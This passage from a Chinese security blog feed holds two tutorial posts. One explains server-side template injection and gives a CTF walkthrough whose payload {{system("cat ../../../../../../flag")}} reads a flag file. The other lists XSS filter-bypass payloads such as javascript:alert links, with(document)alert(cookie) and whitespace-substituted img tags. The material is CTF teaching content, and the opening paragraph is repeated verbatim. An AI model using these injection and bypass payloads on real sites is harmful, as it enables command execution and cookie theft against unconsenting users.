        <content type="html"><![CDATA[<h1 id="什么是SSTI："><a href="#什么是SSTI：" class="headerlink" title="什么是SSTI："></a>什么是SSTI：</h1><p>SSTI 就是服务器端模板注入，当前使用的一些框架，比如<code>python</code>的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p><p>当前使用的一些框架，比如<code>python</code>的<code>flask</code>，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p><h2 id="PHP中常见的SSTI"><a href="#PHP中常见的SSTI" class="headerlink" title="PHP中常见的SSTI"></a>PHP中常见的SSTI</h2><p><code>php</code>常见的模板：twig，smarty，blade，等等。。</p><h5 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h5><p><code>Twig</code>是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像<code>Mustache</code>和<code>liquid</code></p><h3 id="题目案例-CISCN-2019华东南-Web11"><a href="#题目案例-CISCN-2019华东南-Web11" class="headerlink" title="题目案例[CISCN 2019华东南]Web11"></a>题目案例[CISCN 2019华东南]Web11</h3><p>一看题目我还以为是 XFF 直接抓包试试看、</p><p><img src="https://img1.imgtp.com/2023/09/13/yoRsvAzf.png"></p><p>好像没啥用的样子，这里应该是模板注入可以测试一下</p><p>输入：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">9</span>*<span class="number">9</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/13/h3UmaEzs.png"></p><p> 回显81，证明有SSTI漏洞，应该是PHP的 SSTI注入</p><p><img src="https://img1.imgtp.com/2023/09/13/xkeIOWw5.png"></p><p>直接用 ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(<span class="string">&quot;cat ../../../../../../flag&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>获取flag</p><p><img src="https://img1.imgtp.com/2023/09/13/cEhOPMqj.png"></p><p><code>Python</code>当中常见的SSTI<br><code>python</code>常见的模板有：<code>Jinja2</code>，<code>tornado</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__dict__　　 ：保存类实例或对象实例的属性变量键值对字典</span><br><span class="line">__class__　　：返回一个实例所属的类</span><br><span class="line">__mro__　　  ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__bases__　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）__base__　　 ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line">__subclasses__　　：以列表返回类的子类</span><br><span class="line">__init__　　 ：类的初始化方法</span><br><span class="line">__globals__　　   ：对包含函数全局变量的字典的引用__builtin__&amp;&amp;__builtins__　　：python中可以直接运行一些函数，例如<span class="built_in">int</span>()，<span class="built_in">list</span>()等等。　　　　　　　　　　　　　　　　　　这些函数可以在__builtin__可以查到。查看的方法是<span class="built_in">dir</span>(__builtins__)　　　　　　　　　　　　　　　　　　在py3中__builtin__被换成了builtin　　　　　　　　　　　　　　　　　　<span class="number">1.</span>在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。　　　　　　　　　　　　　　　　　　<span class="number">2.</span>非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> SSTI漏洞 </tag>
            
            <tag> python安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS各种过滤手段，如何绕过写payload</title>
      <link href="/2023/09/13/XSS%E5%90%84%E7%A7%8D%E8%BF%87%E6%BB%A4%E6%89%8B%E6%AE%B5%EF%BC%8C%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E5%86%99payload/"/>
      <url>/2023/09/13/XSS%E5%90%84%E7%A7%8D%E8%BF%87%E6%BB%A4%E6%89%8B%E6%AE%B5%EF%BC%8C%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E5%86%99payload/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h1><p>XSS全称是Cross Site Scripting即跨站脚本，当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，意思就是说可以任意执行js代码，包括js的而已代码</p><h2 id="如何进行payload的构造："><a href="#如何进行payload的构造：" class="headerlink" title="如何进行payload的构造："></a>如何进行payload的构造：</h2><p>我们知道xss漏洞不会这么简单的被你发现，通常来说开发者都会对用户输入的东西进行过滤，比如简单的就是 将<code>&lt;script&gt;</code> <code>&lt;ifraname&gt;</code>还有&lt; 等进行过滤，用户输入的时候就可以防止js命令随意的执行，但是我们知道这种方法并不是绝对安全的，我们可以通过其他标签来构造payload，在ctf比赛中非常喜欢考察。</p><h3 id="事件过滤："><a href="#事件过滤：" class="headerlink" title="事件过滤："></a>事件过滤：</h3><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">onbeforeprint</span><br><span class="line">onbeforeunload</span><br><span class="line">onerror</span><br><span class="line">onhaschange</span><br><span class="line">onload</span><br><span class="line">onmessage</span><br><span class="line">onoffline</span><br><span class="line">ononline</span><br><span class="line">onpagehide</span><br><span class="line">onpageshow</span><br><span class="line">onpopstate</span><br></pre></td></tr></table></figure><p>一些常见的fuzz，我们在渗透测试中可以进行输入测试，对它进行fuzz测试</p><p>测试到没有进行过滤的事件，那么我们可以用来构造payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;点&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="敏感关键词（字符串过滤）"><a href="#敏感关键词（字符串过滤）" class="headerlink" title="敏感关键词（字符串过滤）"></a>敏感关键词（字符串过滤）</h4><p>关键字过滤大部分是针对敏感变量或函数而进行的，如cookie、eval等，这部分的过滤可通过字符串拼接、编码解码等方法进行绕过。</p><h4 id="字符串拼接与混淆"><a href="#字符串拼接与混淆" class="headerlink" title="字符串拼接与混淆"></a>字符串拼接与混淆</h4><p>在Javascript中可以通过调用 数组来执行xss命令，比如</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>[<span class="string">&#x27;alert&#x27;</span>](<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure><p>将base64转换为原来的，输出的那么就是 alert 了</p><h2 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xss漏洞中常见的编码方式</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">HTML</span>进制编码：十进制（<span class="selector-tag">a</span>）、十六进制</span><br><span class="line"></span><br><span class="line">css进制编码： 兼容<span class="selector-tag">HTML</span>中的进制表现形式，十进制、十六进制</span><br><span class="line"></span><br><span class="line">Javascript进制编码：八进制、十六进制、Unicode编、ASCII</span><br><span class="line"></span><br><span class="line">url编码：%<span class="number">61</span>（包含%什么的，我们常在url栏可以看到）</span><br><span class="line"></span><br><span class="line">JSFUCK编码</span><br></pre></td></tr></table></figure><h2 id="过滤“-”"><a href="#过滤“-”" class="headerlink" title="过滤“.”"></a>过滤“.”</h2><p>在Javascript中使用with 可以设置变量的作用域，利用此特征可以对“.”进行过滤</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">with</span>(document)<span class="built_in">alert</span>(cookie);</span><br></pre></td></tr></table></figure><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p>在标签可以使用 0x09、0x10、0x12、0x13、0x0a 等代替空格进行过滤</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>xxx.com/xss.php?text=&lt;img0x09src=javascript:alert(<span class="string">&#x27;xss&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure><h3 id="SVG标签"><a href="#SVG标签" class="headerlink" title="SVG标签"></a>SVG标签</h3><p>svg标签和语句遵循的规则是直接继承xml而不是html，区别在于svg内部的script标签中允许在部分进制或编码后的字符（比如实体编码）</p><p>字符串集编码导致绕过<br>当字符集编码存在问题时常常会导致一些出乎意料的绕过。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
